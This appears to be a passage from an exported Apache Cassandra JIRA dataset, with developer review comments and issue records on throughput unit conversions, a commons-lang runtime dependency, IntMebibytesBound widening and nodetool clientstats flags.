 * [several changes in output|https://github.com/ekaterinadimitrova2/cassandra/commit/92e0c3948fc65b29fbe289814f84aaf603188152] - I tried instead to clarify the unit in the description
 * [cassandra.yaml|https://github.com/ekaterinadimitrova2/cassandra/commit/153ccb6dfff630b2229bbcc5c92d201e5e5d2616] - there were a few parameters which were commented for testing and that was not reverted. It doesn't break anything as then we are using the same default value which is in DatabaseDescriptor but it is not needed change and makes it confusing for the users
 * I believe this [withBufferSizeInMB|https://github.com/ekaterinadimitrova2/cassandra/commit/d16170fd6a15f2ec20acd057e8f44ec5ded39094] method had to be deprecated and not just removed

And a few topics I am adding for discussion:

- [https://github.com/apache/cassandra/commit/5bb4bab12f8edfef95ed13cbabf8c0f377986065#diff-f7dd0237c343649f70b7ec9fefd7f6941a40b5164fd6063dce00fc09d2c234a7L163-R163] - method which is not exposed by the mbean but it is public; is this a breaking change?
 * [https://github.com/apache/cassandra/commit/c51a7c66fc21ca2da08b89ae5f9b4817ee4d8c23#diff-2314788f556b14ab8cd9c4cf4eba04f4b292f0b9c93d74919eed33a0af42ababL279-L280] —> breaking change?? - I doubt it but double-checking. I can revert it just to be on the safe side

And a bug I found that I want to ask [~jolynch] for advise as he was involved into adding that property:

[https://github.com/apache/cassandra/commit/9f56bf4ca7fdb61ad09e5f2ad09b87cd01e0716b#diff-77707d0908c31940828b6425dcb09a7409827db99b48c371f71c63294dfe1562L444-R444] —> please check, I believe this change is a bug. The Converter used for that property with the pre-4.0 format does not allow negatives and we will always have 0 in AutoSavingCache where we check for negatives and not 0. The test where this was set to -1 is testKeyCacheLoadZeroCacheLoadTime and it works without an issue with 0. . For [~jolynch] - long story short we prohibited the usage of negatives as it was considered a bug in 4.1. But it seems different here with this property. If negatives and 0 will do the same (I am not sure, didn’t dive too much into that patch), maybe we can use the  _NEGATIVE_SECONDS_DURATION_ converter from the Converters class we added for validation_preview_purge_head_start which will convert a negative number to 0 in 4.1 and tell people from now on will use 0 to disable but at the same time if they upgrade with negative and the old value format and property name, they will be able to set negative number which will be migrated internally to 0. I am really not completely sure, what do others think?

CI running here for the 4.1 branch: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1767/workflows/5f62f5d2-0930-4084-9031-61e1087b22fb], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1767/workflows/781c87d6-9ea1-45ad-838e-53e0d9ee50ee]

[~maedhroz] , [~dcapwell] , [~mck] , can I ask you for review, please?;;;","05/Jul/22 13:28;e.dimitrova;{quote}And a bug I found that I want to ask [~jolynch] for advise as he was involved into adding that property:

[https://github.com/apache/cassandra/commit/9f56bf4ca7fdb61ad09e5f2ad09b87cd01e0716b#diff-77707d0908c31940828b6425dcb09a7409827db99b48c371f71c63294dfe1562L444-R444] —> please check, I believe this change is a bug. The Converter used for that property with the pre-4.0 format does not allow negatives and we will always have 0 in AutoSavingCache where we check for negatives and not 0. The test where this was set to -1 is testKeyCacheLoadZeroCacheLoadTime and it works without an issue with 0. . For [~jolynch] - long story short we prohibited the usage of negatives as it was considered a bug in 4.1. But it seems different here with this property. If negatives and 0 will do the same (I am not sure, didn’t dive too much into that patch), maybe we can use the  _NEGATIVE_SECONDS_DURATION_ converter from the Converters class we added for validation_preview_purge_head_start which will convert a negative number to 0 in 4.1 and tell people from now on will use 0 to disable but at the same time if they upgrade with negative and the old value format and property name, they will be able to set negative number which will be migrated internally to 0. I am really not completely sure, what do others think?
{quote}
Or maybe [~hari_nv] or [~marcuse] can help me with this question as you were also working on CASSANDRA-14898 where the property was added?;;;","07/Jul/22 17:25;maedhroz;bq. maybe we can use the  NEGATIVE_SECONDS_DURATION converter from the Converters class we added for validation_preview_purge_head_start which will convert a negative number to 0 in 4.1 and tell people from now on will use 0 to disable but at the same time if they upgrade with negative and the old value format and property name, they will be able to set negative number which will be migrated internally to 0. I am really not completely sure, what do others think?

The sequence in the code is...

{noformat}
long start = nanoTime();
...
long loadByNanos = start + TimeUnit.SECONDS.toNanos(DatabaseDescriptor.getCacheLoadTimeout());
while (nanoTime() < loadByNanos && in.available() > 0)
{
// do saved cache loading stuff
{noformat}

So unless the high-resolution clock goes backwards, -1 and 0 should have the same effect. (i.e. {{start == loadByNanos}} and getting {{nanoTime()}} again should be >= {{start}}) The condition of the {{while}} loop, if interpreted strictly as ""don't try any more saved cache loading if we've hit the load-by time"", is fine, and I think the only concern we have is making sure an inherited -1 from an old config doesn't make things explode. (There was never any explicit checking for -1 in the original patch that I can see.);;;","07/Jul/22 17:29;maedhroz;If the original logic had been...

{noformat}
while (nanoTime() <= loadByNanos && in.available() > 0)
{noformat}

...perhaps you could have imagined a case for zero where the clock didn't advance, and you would have been able to load the first table in the while body, but that seems pretty esoteric.;;;","07/Jul/22 21:19;maedhroz;{quote}The only thing I am wondering here is how to handle that nodetool and the StorageService JMX methods are rounding to int and 0 very small values in megabits to MiB/s (the getters in MiB, when we provide too small megabits) I added in nodetool a check that will say instead of unlimited - 1 MiB/s. I plan to document that when you use one or the other unit you should use the respective setter/getter as otherwise you might see that side effect. Seeing 0 in MiB - someone might decide that they are unthrottling when in reality they have super low value in megabits internally. What do others think about this?
{quote}
Why don't we just simplify things and leave MiB/s values as doubles everywhere? If we do that for JMX and {{{}nodetool{}}}, can't we just sidestep the rounding ambiguity almost entirely? (I mean, we still need to decide on how many decimals we'll report, but we can probably do 2 or 3 and call it a day.) I don't see any reason to force a rounded/integer output when it would only materialize in conjunction with our new flag.

Other minor notes from my pass at review:
 - In the {{MEGABITS_TO_MEBIBYTES_PER_SECOND_DATA_RATE}} JavaDoc, ""megatibs"" -> ""megabits""?
 - There's enough in common that it might be nice to combine {{SetGetInterDCStreamThroughputMiBTest}} and {{SetGetInterDCStreamThroughputTest}} into a single {{{}InterDCStreamThroughputConfigTest{}}}. (Same goes for the non-inter-DC versions.)
 - In {{{}StorageService{}}}, we have {{{}int oldValue = (int) DatabaseDescriptor.getStreamThroughputOutboundMebibytesPerSec();{}}}. Why not just get the existing value as a double and log it that way? (Happens in {{setStreamThroughputMebibytesPerSec}} and {{{}setInterDCStreamThroughputMebibytesPerSec{}}}.)
 - Given we're going to a new major version, did we really have to change {{MiB}} back to {{MB}} in [this commit|https://github.com/ekaterinadimitrova2/cassandra/commit/92e0c3948fc65b29fbe289814f84aaf603188152]? Even if someone was parsing tool output, they still would only break if they explicitly validated ""MB"" rather than just making sure to take the numeric value, right?
 - Two things on {{""i"", ""stream_throughput_mib""}}. First, is the normal pattern to use hyphens instead of underscores for the long form? Second, given this is a modifier on the default argument, why not just use something like {{""m"", ""mib""}}?;;;","10/Jul/22 23:39;e.dimitrova;{quote}...perhaps you could have imagined a case for zero where the clock didn't advance, and you would have been able to load the first table in the while body, but that seems pretty esoteric.
{quote}
That's what I was thinking but figured that the world of Cassandra is always surprising me so better to check also with reviewer/authors. I will take care of the converter
{quote}bq. Why don't we just simplify things and leave MiB/s values as doubles everywhere?
{quote}
While it is tempting, I think it might be confusing for the end users. They can't be setting double numbers but they are getting some and only for the mebibytes version. Also, we cannot switch to doubles for the megabits which are 4.0-addition properties and they will still suffer of that problem. This is also an issue with the bulk loader that [~frankgh] fights. In theory I would expect/recommend people to set and get with the same unit, but the practice is different - someone will come and just use the first getter they see to check values...

I started wondering whether we should not make those flags bytes and not mebibytes and internally those properties also can be operated in bytes. It will also automatically solve the Settings Virtual table (the precision there) as a side effect. But he issue is that people will have to input quite big numbers and they can make mistakes, MiB/s was not chosen randomly I think. 
{quote} - Given we're going to a new major version, did we really have to change {{MiB}} back to {{MB}} in [this commit|https://github.com/ekaterinadimitrova2/cassandra/commit/92e0c3948fc65b29fbe289814f84aaf603188152]? Even if someone was parsing tool output, they still would only break if they explicitly validated ""MB"" rather than just making sure to take the numeric value, right?{quote}
I would personally keep the MiB but after all latest discussions I would prefer to revert it and just use it in the description, if you don't mind :) 
{quote} - Two things on {{{}""i"", ""stream_throughput_mib""{}}}. First, is the normal pattern to use hyphens instead of underscores for the long form? Second, given this is a modifier on the default argument, why not just use something like {{{}""m"", ""mib""{}}}?{quote}
Good catch, definitely hyphens. I like the idea of switching to ""mib"" and ""m"", I will change this.
{quote} - In the {{MEGABITS_TO_MEBIBYTES_PER_SECOND_DATA_RATE}} JavaDoc, ""megatibs"" -> ""megabits""?
 - There's enough in common that it might be nice to combine {{SetGetInterDCStreamThroughputMiBTest}} and {{SetGetInterDCStreamThroughputTest}} into a single {{{}InterDCStreamThroughputConfigTest{}}}. (Same goes for the non-inter-DC versions.){quote}
Will include in the PR tomorrow, thanks;;;","11/Jul/22 17:20;maedhroz;bq. While it is tempting, I think it might be confusing for the end users. They can't be setting double numbers but they are getting some and only for the mebibytes version. Also, we cannot switch to doubles for the megabits which are 4.0-addition properties and they will still suffer of that problem.

I would really like to avoid rounding. The comment [here|https://github.com/ekaterinadimitrova2/cassandra/commit/d5e7134c99e5e938b74c2ad74fbf2c916f0785ce#diff-f365bd58caccc9a8022b55c1d7706d7543057a56333df0a9ab5b952c29d96695R38] doesn't feel very friendly. Even if we can't use non-integers in any of our setters, not using exact values for the getter seems suboptimal. (What if someone doesn't pay attention to the option comment? I'd rather have an error message saying you need to use integers in the setter than rely on that.)

Other than that, +1 from me.

EDIT: Let's also make sure we don't explode on an inherited {{-1}} for {{cache_load_timeout_seconds}}. The {{NEGATIVE_SECONDS_DURATION}} solution works for me, along the lines of our discussion above.;;;","15/Jul/22 19:50;e.dimitrova;I just rebased and pushed a [commit|https://github.com/ekaterinadimitrova2/cassandra/commit/09d0a4104d803771bef4f5d0637e64aeee771ce8] to address the review comments, except for the doubles.

A proposal I have is:
 * the old deprecated methods (from 4.0; getStreamThroughputMbPerSec and getInterDCStreamThroughputMbPerSec) still should return int but we can throw error message that they need either to use some of the other methods or to set a whole number in megabits when the actual number internally is not an integer.
 * make all new methods (both megabits and mibs) to return double plus printing double in the setters as you pointed.

Does this sound reasonable and do you think I should confirm it on the mailing list?

Also, further to the review comments I added the check for upper bound when assigning the two old properties in the setters and added a unit test for that. I also added a unit test for cache_load_timeout_seconds = -1. ;;;","15/Jul/22 20:26;maedhroz;bq. Does this sound reasonable and do you think I should confirm it on the mailing list?

I'd rather have an explicit error message than hidden rounding. If that's the approach you like best that avoids the latter, I'm fine w/ it. (For the new methods, I don't even care if we print whole number if there are no significant digits after the decimal anyway.) Probably doesn't rise to the level of needing ML involvement, but it never hurts.

bq. I also added a unit test for cache_load_timeout_seconds = -1. 

Sweet.;;;","18/Jul/22 14:28;e.dimitrova;[Mail|https://lists.apache.org/thread/vgnjnkhbml7zocxpohth8x443rzgvbz5] fired to the mailing list. ;;;","25/Jul/22 01:09;e.dimitrova;As agreed on the Mailing list I went for error out in the old megabits int JMX methods.

Further to that, I realized that we better move the 4 properties to LongBytesBound internally so that we do not struggle internally with megabits to mebibytes and the opposite as the Rate Limiter is also getting bytes anyway. Also, this will help with another ticket (CASSANDRA-17677) where if we keep the mebibytes/s internally we should do a bunch of not needed calculations. CC [~frankgh] 

Now the issue that [CI reminded me of|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=test-bytes-4.1] is that JMX getters should not throw exceptions. (Please check the in-jvm failure - org.apache.cassandra.distributed.test.jmx.JMXGetterCheckTest.test, the other 2 were test issues that I already fixed) We can error out in nodetool I guess but tools as JConsole will just output Unavailable the attribute which is bad. :( 

So I guess what we can do is to add double version of those methods and deprecate the old ones? Nodetool I guess we can make to error out but the JMX methods - we will have to leave to round and put in bold everywhere a point about the rounding - the docs, the NEWS.txt, CHANGES.txt and we can even make a point on social media...

What do you think about that?

This is the new branch where the latest suggestion resides: [4.1|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:test-bytes-4.1] , the last two commits;;;","25/Jul/22 02:31;e.dimitrova;Also, in the Settings Virtual Table the old property will be rounded, note to self - I have to make the new MiB properties to return there double... 

One more point - the posted branch is not ready for full-fledged review, it is draft for confirming the final version we want as it is easier to show some code than just descriptions. ;;;","25/Jul/22 16:24;maedhroz;bq. So I guess what we can do is to add double version of those methods and deprecate the old ones?

As long as nothing new does any rounding, fine with me. We could also just not have the old {{nodetool}} commands worry about {{MiB}}, given there are going to be new methods anyway, where we won't have to round.;;;","26/Jul/22 21:06;e.dimitrova;{quote}We could also just not have the old {{nodetool}} commands worry about {{{}MiB{}}}, given there are going to be new methods anyway, where we won't have to round.
{quote}
We can't really as then the setters will be adding the 2 new entire_sstable* parameters in mebibytes/s and the old two in megabits/s which I bet will be a total mess unfortunately.

I did the changes, added a bunch of unit tests. Also took care about compaction_throughput as it was suffering from the same issues even if it was already in mebibytes/s. (nodetool takes it in MiB/s)

Further to the setters/getters CompactionStats was also affected from the rounding. The good news are that it was already producing output in bytes so I just had to change the methods to point to the right byte methods to ensure no intermediate non-precise calculation happens in between. 

This is the new 4.1  [PR|https://github.com/apache/cassandra/pull/1754]. I still haven't squashed with the old commits you already saw, hopefully to make it easier to review this last part. The patch is rather noisy and it adds a lot of unit tests as the devil is in the details with this one.

[CI is fully green.|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17725-4.1] ;;;","01/Aug/22 16:14;e.dimitrova;I just submitted a commit to address any feedback from the previous PR [here|https://github.com/ekaterinadimitrova2/cassandra/commit/0a5da08fc4d269e2b7e0f5b23d44fd759821ecec]

CI run  [#1828|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17725-4.1], there is only one [failed test|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1828/workflows/eadcc3a3-ec7d-40f3-99ec-fcf9b6db8d11/jobs/14115/tests#failed-test-0] which seems unrelated but  we might want to open a followup ticket?

Also, for the record, we agreed to remove IntMeibytesBound nested class now when it is not needed anymore and we don't want to encourage people to start using it. (while we are still in alpha release);;;","01/Aug/22 18:06;maedhroz;+1 LGTM

bq. there is only one failed test which seems unrelated but  we might want to open a followup ticket?

WFM...the CAS tests seem generally flaky right now;;;","01/Aug/22 18:09;e.dimitrova;Thanks [~maedhroz] , I will wait to see if [~frankgh] is happy with the latest changes and then squash, add the NEWS.txt entries and propagate also to trunk. Pending also full CI;;;","01/Aug/22 18:13;frankgh;Looks good to me! Thanks for addressin the feedback;;;","01/Aug/22 21:19;e.dimitrova;Thank you both [~frankgh] and [~maedhroz] .

I squashed the commits, updated NEWS.txt and CHANGES.txt and also propagated the patch to trunk.
||Patch||CI||
|[4.1|https://github.com/apache/cassandra/commit/314ac8d890c90930e14d5e45744e3da229015443]| [Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17725-4.1-final]|
|[trunk|https://github.com/apache/cassandra/commit/9355fd9603ee7c1e0730091559722be0ae2101b2]|[Circle CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17725-trunk-final]|

Pending commit on CI, also I will reformat a bit the commit msg on commit.;;;","01/Aug/22 23:03;e.dimitrova;CI results:

4.1 - [test_parent_repair_session_cleanup|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1830/workflows/0ca3086d-6651-4f06-acab-2cd2ea208d93/jobs/14139/tests#failed-test-0]  failed for port being potentially busy to be used by Jolokia, I think this is environmental seen with different tests before

trunk -  [transient_replication_test.TestTransientReplicationRepairStreamEntireSSTable|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1829/workflows/b123b955-9fbb-413e-a2a5-8f654dabee1f/jobs/14193/tests#failed-test-0] failed for port being potentially busy to be used by Jolokia, same as the previous one

Also, I reran those two tests locally and they pass successfully.

Starting commit soon.  ;;;","02/Aug/22 01:02;e.dimitrova;Committed:

fe28f482db..dd08314ed6  cassandra-4.1 -> cassandra-4.1

0daf21244f..62ac5da78a  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove commons-lang dependency during build runtime,CASSANDRA-17724,13469505,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,frankgh,frankgh,frankgh,30/Jun/22 17:11,16/Dec/22 21:54,13/Jul/23 08:40,07/Jul/22 00:47,4.1,4.1-beta1,,,,,Build,,,,0,,"{{commons-lang}} is not a runtime dependency and a {{java.lang.NoClassDefFoundError: org/apache/commons/lang/StringUtils}} exception is encountered during startup when hitting the codepath in {{{}StartupClusterConnectivityChecker{}}}.

This error is encountered very infrequently, but it has the potential of preventing the {{CassandraDaemon}} from starting up.

Currently, the Cassandra project allows developers to import the {{org.apache.commons.lang.\*}} namespace. The Cassandra build process should fail when {{org.apache.commons.lang.\*}} namespace imports are added to the code. This will prevent anyone from adding a build runtime library that is not available during runtime.",,djoshi,frankgh,yifanc,,,,,,,,,,,,"frankgh opened a new pull request, #1711:
URL: https://github.com/apache/cassandra/pull/1711

   `commons-lang` is not a runtime dependency and a `java.lang.NoClassDefFoundError: org/apache/commons/lang/StringUtils`
   exception is encountered during startup when hitting the codepath in `StartupClusterConnectivityChecker`.
   
   This error is encountered very infrequently, but it has the potential of preventing the `CassandraDaemon` from starting up.
   
   This commit will fail the build process when the `org.apache.commons.lang.*` namespace is used in the code. This will prevent anyone from adding the `commons-lang` build runtime dependency that is not available during runtime.
   


;30/Jun/22 17:17;githubbot;600","frankgh opened a new pull request, #1712:
URL: https://github.com/apache/cassandra/pull/1712

   `commons-lang` is not a runtime dependency and a `java.lang.NoClassDefFoundError: org/apache/commons/lang/StringUtils`
   exception is encountered during startup when hitting the codepath in `StartupClusterConnectivityChecker`.
   
   This error is encountered very infrequently, but it has the potential of preventing the `CassandraDaemon` from starting up.
   
   This commit will fail the build process when the `org.apache.commons.lang.*` namespace is used in the code. This will prevent anyone from adding the `commons-lang` build runtime dependency that is not available during runtime.
   


;30/Jun/22 17:24;githubbot;600","smiklosovic closed pull request #1712: CASSANDRA-17724: Remove commons-lang dependency during build runtime
URL: https://github.com/apache/cassandra/pull/1712


;07/Jul/22 05:48;githubbot;600","smiklosovic closed pull request #1711: CASSANDRA-17724: Remove commons-lang dependency during build runtime
URL: https://github.com/apache/cassandra/pull/1711


;07/Jul/22 05:48;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,frankgh,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 07 00:47:19 UTC 2022,,,yifanc,,,,All,,,,"0|z16idc:",9223372036854775807,,,,djoshi,ycai,,,Critical,,4.1-alpha1,,https://github.com/apache/cassandra/commit/a250126f0f277b43a18cb665ccd02a105271bc33,,,,,,,,,Patch available here: https://github.com/apache/cassandra/pull/1711 Build fails when using {{org.apache.commons.lang.\*}},,,,,"30/Jun/22 17:25;frankgh;|[trunk|https://github.com/apache/cassandra/pull/1711]|[CircleCI|https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17724&filter=all]|
|[4.1|https://github.com/apache/cassandra/pull/1712/files]|[CircleCI|https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17724-4.1&filter=all]|;;;","30/Jun/22 17:54;yifanc;+1 on the patch.

Ultimately, we want to remove the legacy hadoop code as described in CASSANDRA-16984;;;","06/Jul/22 20:43;djoshi;+1 LGTM. thank you for the patch.;;;","07/Jul/22 00:47;yifanc;Committed into 4.1 as [a250126f|https://github.com/apache/cassandra/commit/a250126f0f277b43a18cb665ccd02a105271bc33] and merged up into trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix widening - mebibytes to bytes in IntMebibytesBound,CASSANDRA-17716,13468639,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,27/Jun/22 15:35,05/Oct/22 22:22,13/Jul/23 08:40,28/Jun/22 18:51,4.1,4.1-beta1,5.0,,,,Local/Config,,,,0,,"Follow up on CASSANDRA-17650

We need to add toBytesInLong method in IntMebibytesBound to support widening for a few parameters identified in CASSANDRA-17650

CC [~adelapena] ",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17650,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jun 28 18:50:04 UTC 2022,,,,,,,All,,,,"0|z16eaw:",9223372036854775807,,,,adelapena,e.dimitrova,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/495d609c89618e2c74cddd8bf6246a833852a64a,,,,,,,,,"||Patch||CI||
|[4.1|https://github.com/apache/cassandra/commit/cf460ccaa9c690ef48224a1ed1db026fc414adb9]|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1747/workflows/ac92a46a-fa2a-47f8-be94-185f7e2940e3], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1747/workflows/d4c359d1-0513-4df9-bc21-10b1168a0b9f]|
|[trunk|https://github.com/apache/cassandra/commit/5ea54e7d9f652ebb6c45ef611a8ee2f6cfd1f558]|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1748/workflows/95291d91-1164-4fae-a82a-2fd10b52f405], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1748/workflows/a9feb92b-c873-482c-8c13-4df33a10ec30]|",,,,,"27/Jun/22 15:55;e.dimitrova;||Patch||CI run||
|[4.1|https://github.com/apache/cassandra/commit/789c0b3e0f890587365da1dcafb43dc1c7a638e3]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=fix-IntMebibytesBound&filter=all]|
|[trunk|https://github.com/apache/cassandra/commit/19e2ae0526fd34ff4bcf3d788be4856b79dbbff1]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17716-trunk&filter=all]|

Waiting for tests to complete;;;","27/Jun/22 23:06;e.dimitrova;4.1:

paxosRepairVersionGate - CASSANDRA-17573

modifySchemaWithStoppedNode - new one

trunk:

testSuccessfulWriteBeforeRangeMovement - CASSANDRA-17461

testOutboundConnectionsAreInterruptedWhenAuthFails - probably related to CASSANDRA-17708

testSparseMode - CASSANDRA-13169, seems like a known rear flaky which was not fixed for a long time

test_multiple_repair - known to be failing from time to time with client request timeout. Not sure whether we want to open a ticket

org.apache.cassandra.distributed.test.TopPartitionsTest - failing also in Jenkins, I will open a ticket 

test_compaction_throughput - {*}{*}CASSANDRA-17587

 
basicRowTombstonesTest[Incremental] - I believe it is a test issue, we've seen it in other tests too. I will open a ticket and push a patch. 
utests_system_keyspace_directory -  CASSANDRA-17489

test_prefer_local_reconnect_on_listen_address - CASSANDRA-17700
 ;;;","27/Jun/22 23:13;e.dimitrova;[~adelapena], do you mind to review it as you are already familiar with the topic?  ;;;","28/Jun/22 10:49;adelapena;Sure, I'll take a look;;;","28/Jun/22 12:04;adelapena;Looks good to me, I have just left a suggestion about testing.;;;","28/Jun/22 18:29;e.dimitrova;Thank you [~adelapena] !

Applied the suggestion, squashed, rebased, and pushed CI again. 
||Patch||CI||
|[4.1|https://github.com/apache/cassandra/commit/cf460ccaa9c690ef48224a1ed1db026fc414adb9]|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1747/workflows/ac92a46a-fa2a-47f8-be94-185f7e2940e3], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1747/workflows/d4c359d1-0513-4df9-bc21-10b1168a0b9f]|
|[trunk|https://github.com/apache/cassandra/commit/5ea54e7d9f652ebb6c45ef611a8ee2f6cfd1f558]|[j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1748/workflows/95291d91-1164-4fae-a82a-2fd10b52f405], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1748/workflows/a9feb92b-c873-482c-8c13-4df33a10ec30]|

No new failures, 4.1 is even scary green. Starting commit;;;","28/Jun/22 18:50;e.dimitrova;Committed 

To https://github.com/apache/cassandra.git

   dcb4768345..495d609c89  cassandra-4.1 -> cassandra-4.1

   07d97d7905..63c6467746  trunk -> trunk

 

Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
nodetool clientstats - client_options to be exposed by adding a new flag,CASSANDRA-17715,13463053,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,23/Jun/22 23:36,05/Oct/22 22:22,13/Jul/23 08:40,27/Jun/22 23:44,4.1-beta1,5.0,,,,,Tool/nodetool,,,,0,,client_options column (CASSANDRA-16378) should appear when using a new flag (to be introduced) to expose client_options instead of being added at the back of the current output. This is needed to ensure backward compatibility of the output is preserved. ,,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16378,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 15:53:28 UTC 2022,,,,,,,All,,,,"0|z15fts:",9223372036854775807,,,,brandon.williams,,,,Normal,,,,https://github.com/apache/cassandra/commit/dcb4768345e0fe96420c4f4597e2eb822040d15a,,,,,,,,,Updated ClientStateTest and added a new test for the new flag,,,,,"24/Jun/22 21:46;e.dimitrova;[4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/3247dd9e431b42c4171b2650bca571f82855b773] - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17715-4.1&filter=all]

[trunk|https://github.com/apache/cassandra/commit/3247dd9e431b42c4171b2650bca571f82855b773] - [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17715-trunk&filter=all]

Updated the current unit tests and added a new one for the new flag introduced. ;;;","27/Jun/22 15:04;brandon.williams;LGTM, but I think you forgot to increase the circle resources as a bunch of tests are failing.;;;","27/Jun/22 16:56;e.dimitrova;{quote}I think you forgot to increase the circle resources as a bunch of tests are failing.
{quote}
_Someone_ forgot to commit the config after applying it....

Just pushed it to CI again. Pending commit on the test results. Thanks!;;;","27/Jun/22 16:57;e.dimitrova;Note to self: We need both NEWS.txt and CHANGES.txt entries on commit;;;","27/Jun/22 18:19;brandon.williams;CI looks good, +1;;;","27/Jun/22 21:01;e.dimitrova;Thanks!

 

4.1:

testForcedNormalRepairWithOneNodeDown - I saw this recently on 4.0 - it is still there - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1744/workflows/62ec6949-a803-4c93-9fb7-a50a17304d6c]

So seems to me as a failure also for older versions. I will open a ticket 

 

test_prefer_local_reconnect_on_listen_address - CASSANDRA-17700

utests_system_keyspace_directory - CASSANDRA-17489

trunk:

test_prefer_local_reconnect_on_listen_address - CASSANDRA-17700

utests_system_keyspace_directory - CASSANDRA-17489;;;","27/Jun/22 22:09;e.dimitrova;Rebased, changed test name and added the entries in CHANGES.txt, NEWS.txt

Pending commit on last CI run;;;","27/Jun/22 23:21;e.dimitrova;trunk has only one failure not already mentioned - testRemoteStreamFailure - known from  CASSANDRA-17706

4.1 startupNewIP failed -  CASSANDRA-16778

Starting commit;;;","27/Jun/22 23:42;e.dimitrova;Committed to https://github.com/apache/cassandra.git

   33730d9d06..dcb4768345  cassandra-4.1 -> cassandra-4.1

   f8207fe287..07d97d7905  trunk -> trunk;;;","06/Jul/22 15:53;jmckenzie;[CI Results]
Branch: 4.1, build number: 79
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/79/
   JIRA: CASSANDRA-17715
